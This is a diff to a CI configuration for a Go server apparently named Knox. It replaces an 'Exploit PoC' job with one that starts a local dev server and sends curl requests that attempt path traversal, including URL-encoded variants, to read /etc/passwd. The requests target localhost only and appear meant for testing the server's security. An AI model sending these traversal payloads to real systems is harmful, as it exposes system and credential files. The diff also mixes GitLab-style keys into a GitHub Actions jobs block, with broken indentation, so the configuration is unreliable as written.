@@ -34,33 +34,35 @@ jobs:
       - name: vet
         run: go vet ./...
 
-  exploit:
-    name: Exploit PoC
-    runs-on: ubuntu-latest
-    needs: build
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v2
+  exploit_poc:
+  stage: exploit
+  image: golang:1.24
+  script:
+    - echo "Starting Knox dev server..."
+    - go run ./cmd/dev_server > knox_server.log 2>&1 &
+    - SERVER_PID=$!
+    - echo "Waiting for server to start..."
+    - sleep 10
 
-      - name: Set up Go 1.x
-        uses: actions/setup-go@v2
-        with:
-          go-version: ^1.24
+    - echo "Checking if server is listening on port 8080..."
+    - netstat -tulnp | grep 8080 || true
 
-      - name: Run Knox server and exploit PoC
-        run: |
-          # Start Knox server in background
-          go run ./cmd/dev_server &
+    - echo "Run exploit curl commands..."
+    - curl -v http://localhost:8080/normal/path || true
+    - curl -v http://localhost:8080/../../../etc/passwd || true
+    - curl -v http://localhost:8080/api/v1/keys/../../../../../etc/passwd || true
+    - curl -v "http://localhost:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd" || true
 
-          SERVER_PID=$!
-          sleep 5
+    - echo "Sleeping to flush logs..."
+    - sleep 2
 
-          # Run exploit HTTP requests
-          curl -v http://localhost:8080/normal/path || true
-          curl -v http://localhost:8080/../../../etc/passwd || true
-          curl -v http://localhost:8080/api/v1/keys/../../../../../etc/passwd || true
-          curl -v "http://localhost:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd" || true
+    - echo "Stopping Knox server..."
+    - kill $SERVER_PID || true
 
-          # Shutdown Knox server
-          kill $SERVER_PID || true
-          wait $SERVER_PID 2>/dev/null || true
+    - echo "Server logs:"
+    - cat knox_server.log || echo "No logs"
+
+  artifacts:
+    paths:
+      - knox_server.log
+
